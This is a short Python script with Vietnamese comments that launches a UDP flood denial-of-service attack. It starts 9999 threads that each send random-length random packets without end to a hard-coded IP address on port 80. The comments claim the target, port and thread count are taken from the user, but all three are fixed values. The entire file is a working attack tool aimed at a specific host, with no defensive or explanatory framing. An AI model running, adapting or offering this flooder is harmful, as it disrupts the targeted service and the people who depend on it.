import socket
import random
import threading

# nhận địa chỉ ip của mục tiêu từ người dùng
target = "103.252.92.161"

# nhận cổng của mục tiêu từ người dùng
port = 80

# nhận số lượng luồng tấn công từ người dùng
threads = 9999

# hàm tạo gói tin ngẫu nhiên
def generate_packet():
    # Độ dài ngẫu nhiên của gói tin
    packet_length = random.randint(10, 1000)
    # nội dung ngẫu nhiên của gói tin
    packet_content = random._urandom(packet_length)
    return packet_content

# hàm tấn công mục tiêu
def attack():
    # tạo một đối tượng socket udp
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # lặp vô hạn
    while True:
        # tạo một gói tin ngẫu nhiên
        packet = generate_packet()
        # gửi gói tin đến mục tiêu
        sock.sendto(packet, (target, port))

# tạo các luồng tấn công
for i in range(threads):
    # khởi tạo một luồng mới với hàm attack
    thread = threading.Thread(target=attack)
    # bắt đầu luồng
    thread.start()